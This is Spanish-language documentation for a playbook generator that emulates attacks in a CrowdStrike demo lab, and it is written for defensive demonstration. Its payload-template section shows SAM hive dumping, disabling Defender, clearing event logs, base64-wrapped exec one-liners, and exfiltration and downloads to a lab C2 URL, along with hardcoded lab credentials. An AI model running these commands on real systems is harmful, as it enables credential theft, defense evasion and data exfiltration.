# Módulo: `playbook_generator.py`

**Clase:** `PlaybookGenerator`
**Dependencias:** `yaml`, `json`, `base64`, `datetime`

---

## Responsabilidad

Genera playbooks JSON compatibles con Shadow-Replay y documentación Markdown de demo a partir de:
- El análisis LLM de la amenaza
- La secuencia de ataque generada
- Los IOCs extraídos
- La topología del lab (leída de `config.yaml`)

Todos los payloads generados usan las IPs/credenciales reales del lab y son reducidos a **una sola línea** (`_to_oneliner`) antes de escribirse al JSON.

---

## `__init__(config_path)`

Lee la sección `lab` de `config.yaml` y guarda las IPs y credenciales en atributos de instancia:

```python
self.win_detection_ip  = "10.5.9.31"  # Víctima Windows (detection mode)
self.win_prevention_ip = "10.5.9.30"  # Víctima Windows (prevention mode)
self.linux_ip          = "10.5.9.40"  # Víctima Linux
self.linux_user        = "samba"
self.linux_pass        = "password123"
self.win_unmanaged_ip  = "10.5.9.27"  # Windows sin EDR
self.c2_ip             = "10.5.9.41"
self.c2_port           = 4444
self.c2_url            = "http://10.5.9.41:4444"
```

Fallbacks hardcodeados si `config.yaml` no existe o falla la lectura.

---

## API pública

### `generate(analysis, attack_sequence, iocs, ttps) → Dict`

Genera el playbook Shadow-Replay completo.

```
1. playbook_id = _generate_id(campaign_name)
     └─ "{campaign_name_snake_case}_{YYYYMMDD}"

2. agents = _determine_agents(attack_sequence)
     └─ windows=agent_1, linux=agent_2 (si están en la secuencia)

3. events = _generate_events(attack_sequence, agents, iocs)
     └─ Para cada stage:
          payload = _generate_payload(stage, iocs, agent_type)
          payload = _to_oneliner(payload, payload_type)
     └─ + _generate_cleanup_events(agents)

4. Return {playbook_id, name, description, generated_at, mandatory_agents, events}
```

---

### `generate_demo_brief(playbook, analysis, ttps, snippets, summary) → str`

Genera documentación Markdown para el presentador. Incluye:

1. **Header** — Tabla con metadatos (actor, playbook ID, riesgo, complejidad, tiempo de setup)
2. **Threat Briefing** — Tipo de actor, vector de ataque, plataformas, industrias, geografía, razonamiento
3. **Infrastructure Requirements** — Tabla de agentes con IPs, notas de EDR; Pre-Demo Checklist
4. **ATT&CK Techniques** — Tabla de TTPs con tácticas y descripción
5. **Attack Chain** — Etapas del ataque con técnicas y detecciones esperadas
6. **CrowdStrike Detection Points** — Lista de detecciones específicas
7. **Narrative Summary** — Resumen narrativo del playbook
8. **Emulation Snippets** — Código de emulación con notas de detección

**Pre-Demo Checklist** (generado dinámicamente según qué se use):

```markdown
- [ ] CrowdStrike Falcon console logged in (Detections dashboard)
- [ ] Shadow-Replay runner running, agents connected
- [ ] Windows agent online at 10.5.9.31
- [ ] Linux agent online at 10.5.9.40  (if lateral movement)
- [ ] C2 server accessible at 10.5.9.41:4444
- [ ] Palo Alto logs visible in SIEM
- [ ] Mimecast dashboard open           (if phishing)
- [ ] Tools pre-downloaded              (if T1105 tool transfer)
```

---

## `_determine_agents(attack_sequence) → List[Dict]`

Construye la lista `mandatory_agents` a partir de las plataformas en `attack_sequence`.

```python
_PLATFORM_ORDER = ["windows", "linux", "cloud"]
```

Algoritmo:
1. Extrae el set de plataformas únicas de `attack_sequence`
2. Asigna `agent_N` en el orden de `_PLATFORM_ORDER`
3. Plataformas desconocidas se añaden al final en orden alfabético

**Ejemplos:**

| Plataformas en secuencia | `mandatory_agents` |
|--------------------------|-------------------|
| `{windows}` | `[{agent_1, windows}]` |
| `{windows, linux}` | `[{agent_1, windows}, {agent_2, linux}]` |
| `{linux}` | `[{agent_1, linux}]` |
| `{windows, linux, cloud}` | `[{agent_1, windows}, {agent_2, linux}, {agent_3, cloud}]` |

---

## `_generate_events(attack_sequence, agents, iocs) → List[Dict]`

Genera la lista de eventos de ataque, más los cleanup al final.

```python
for idx, stage in enumerate(attack_sequence):
    platform = stage["platform"]
    agent = agent_map[platform]
    payload_type = "powershell" if agent_type == "windows" else "python"

    # Encadenamiento: next stage o primer cleanup
    if idx < len(attack_sequence) - 1:
        next_trigger = attack_sequence[idx + 1]["stage"]
    else:
        next_trigger = f"cleanup_{agents[-1]['agent_id']}"  # reversed

    events.append({
        "event_id":            stage["stage"],
        "payload":             _to_oneliner(_generate_payload(stage, iocs, agent_type), payload_type),
        "failure_action":      "abort" if idx < 2 else "continue",
        "success_trigger":     next_trigger,
        ...
    })

events += _generate_cleanup_events(agents)
```

---

## `_generate_payload(stage, iocs, agent_type) → str`

Dispatcher que selecciona la plantilla de payload correcta:

**Windows (PowerShell):**

| TID en `technique_id` | Plantilla llamada |
|-----------------------|-------------------|
| `T1566` | `_ps_phishing()` |
| `T1059` | `_ps_execution(iocs)` |
| `T1003` | `_ps_credential_dump()` |
| `T1021` | `_ps_lateral_movement()` |
| `T1547` o `T1053` | `_ps_persistence()` |
| `T1082`, `T1057`, `T1083`, `T1018` | `_ps_discovery()` |
| `T1562` o `T1070` | `_ps_defense_evasion()` |
| `T1105` | `_ps_tool_transfer()` |
| `T1041` o `T1048` | `_ps_exfiltration()` |
| Ninguno de los anteriores | Fallback genérico Windows |

**Linux (Python):**

| TID en `technique_id` | Plantilla llamada |
|-----------------------|-------------------|
| `T1021` o `T1570` | `_py_lateral_receive()` |
| `T1053` o `T1547` | `_py_linux_persistence()` |
| `T1082`, `T1057`, `T1083` | `_py_linux_discovery()` |
| `T1041` o `T1048` | `_py_linux_exfiltration()` |
| Ninguno de los anteriores | Fallback genérico Linux |

---

## `_to_oneliner(code, payload_type) → str`

Colapsa código multi-línea en una sola línea ejecutable.

### PowerShell

```python
lines = [line.strip() for line in code.splitlines()
         if line.strip() and not line.strip().startswith("#")]
return " ".join(lines)
```

Las plantillas PowerShell ya terminan cada statement con `;`, por lo que unir con espacio produce código válido.

**Ejemplo:**
```
# Input (multi-línea):
Write-Host '=== [T1547] PERSISTENCE ===';
# Registry Run key
$regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run';
Set-ItemProperty -Path $regPath -Name 'WindowsUpdateHelper' -Value 'powershell.exe -WindowStyle Hidden' ;
Start-Sleep -Seconds 3;
Remove-ItemProperty -Path $regPath -Name 'WindowsUpdateHelper' ;

# Output (one-liner):
Write-Host '=== [T1547] PERSISTENCE ==='; $regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; Set-ItemProperty -Path $regPath -Name 'WindowsUpdateHelper' -Value 'powershell.exe -WindowStyle Hidden' ; Start-Sleep -Seconds 3; Remove-ItemProperty -Path $regPath -Name 'WindowsUpdateHelper' ;
```

### Python — sin indentación

```python
lines = [l.strip() for l in code.splitlines()
         if l.strip() and not l.strip().startswith("#")]
return "; ".join(lines)
```

**Ejemplo:**
```
# Input:
import os, time
print('[CLEANUP] terminating...')
time.sleep(2)
os._exit(0)

# Output:
import os, time; print('[CLEANUP] terminating...'); time.sleep(2); os._exit(0)
```

### Python — con bloques indentados (`for`, `if`, `try`, `with`, `def`, `class`)

```python
has_indent = any(l != l.lstrip() for l in raw_lines)
if has_indent:
    encoded = base64.b64encode(code.strip().encode()).decode()
    return f"import base64; exec(base64.b64decode('{encoded}').decode())"
```

El script completo se codifica en base64. El runner lo ejecuta con `python3 -c "..."`.

**Detectar indentación:**
```python
raw_lines = [l for l in code.splitlines() if l.strip()]
has_indent = any(l != l.lstrip() for l in raw_lines)
```
Una línea tiene indentación si su versión original (`l`) ≠ su versión sin espacios iniciales (`l.lstrip()`).

---

## Plantillas de payload — descripción funcional

### `_ps_phishing()` — T1566

Simula la apertura de un email de phishing con documento malicioso:
- `Write-Host` con metadata del escenario (víctima, notas Mimecast)
- `Net.WebClient.DownloadString()` al C2 para generar telemetría de red
- Manejo de excepción para no fallar si el C2 no está disponible

**Telemetría generada:** Conexión HTTP saliente a `10.5.9.41:4444`, log en Palo Alto.

---

### `_ps_execution(iocs)` — T1059

Ejecuta un comando vía PowerShell con flags de bypass:
- `-NoProfile -ExecutionPolicy Bypass -EncodedCommand`
- El comando se toma del primer elemento de `iocs["commands"]` (o `whoami /all` como fallback)
- Genera telemetría de script-block logging en CrowdStrike

---

### `_ps_credential_dump()` — T1003

Dos acciones coordinadas:
1. **SAM hive access:** `reg save HKLM\SAM C:\Windows\Temp\s.tmp` → elimina el archivo inmediatamente
2. **Kerberoasting:** `setspn -T . -Q */*` para enumerar SPNs

**Telemetría:** Acceso a HKLM\SAM (alerta de credential dump), enumeración de SPNs.

---

### `_ps_lateral_movement()` — T1021

SSH desde Windows a Linux usando **Posh-SSH**:
1. Instala Posh-SSH si no está disponible (`Install-Module -Scope CurrentUser`)
2. Crea sesión SSH a `10.5.9.40` con `samba/password123`
3. Ejecuta `wget` + `python3` en el Linux victim para iniciar el agente remoto
4. Cierra la sesión SSH

**Telemetría:** Conexión SSH loggeada por Palo Alto (`10.5.9.31 → 10.5.9.40`).

---

### `_ps_persistence()` — T1547

Registry Run key con limpieza automática:
1. `Set-ItemProperty` en `HKCU:\...\Run` con valor `powershell.exe -WindowStyle Hidden`
2. `Start-Sleep -Seconds 3` para que CrowdStrike tenga tiempo de detectar
3. `Remove-ItemProperty` para limpiar

**Telemetría:** Modificación de Run key (alerta de persistencia en Falcon).

---

### `_ps_discovery()` — T1082/T1057/T1018

Enumeración completa del entorno:
- OS version, domain
- Procesos top 10 por CPU
- Conexiones TCP establecidas al rango C2

---

### `_ps_defense_evasion()` — T1562/T1070

Dos acciones:
1. `Set-MpPreference -DisableRealtimeMonitoring $true` (seguro porque CrowdStrike sigue activo)
2. `wevtutil cl System` para limpiar logs de eventos

**Importante:** La máquina usa CrowdStrike en **detection mode**, por lo que estas acciones generan alertas pero no se bloquean.

---

### `_ps_tool_transfer()` — T1105

Descarga de binario desde C2:
1. `Net.WebClient.DownloadFile()` de `http://10.5.9.41:4444/downloads/agent-windows.py`
2. Si la descarga tiene éxito → elimina el archivo inmediatamente
3. Si falla → nota que el beacon fue loggeado por Palo Alto

---

### `_ps_exfiltration()` — T1041

Exfiltración de datos del sistema:
1. Recopila hostname, whoami, domain en JSON compacto
2. `Net.WebClient.UploadString()` a `http://10.5.9.41:4444/exfil`

---

### `_py_lateral_receive()` — T1021 (Linux)

Payload ejecutado en el Linux victim tras recibir la conexión SSH:
1. Verifica conectividad al C2 (`curl -s -w %{http_code}`)
2. Imprime metadata de establecimiento del pivot

---

### `_py_linux_persistence()` — T1053 (Linux)

Cron job con limpieza:
1. Añade `* * * * * echo persistence_check > /dev/null 2>&1` al crontab
2. `time.sleep(3)` para telemetría
3. Elimina la entrada del crontab

---

### `_py_linux_discovery()` — T1082 (Linux)

Ejecuta y muestra: `whoami`, `hostname`, `ip addr show`, `ip route`, `ps aux --sort=-%cpu | head -10`.

---

### `_py_linux_exfiltration()` — T1041 (Linux)

1. Recopila hostname (`socket.gethostname()`) y usuario (`whoami`)
2. `curl POST` a `http://10.5.9.41:4444/exfil` con los datos

---

## `_generate_cleanup_events(agents) → List[Dict]`

Genera eventos de limpieza en orden **inverso** a `mandatory_agents`:

```python
ordered = list(reversed(agents))  # linux primero, windows último
```

**Cleanup Windows:**
```
Write-Host '[CLEANUP]...'; Start-Sleep -Seconds 2; Stop-Process -Id $PID -Force
```

**Cleanup Linux (Python):**
```python
import os, time
print('[CLEANUP]...')
time.sleep(2)
os._exit(0)
```
(Se convierte a one-liner por `_to_oneliner`.)

El último cleanup tiene `success_trigger = null` (fin del playbook).
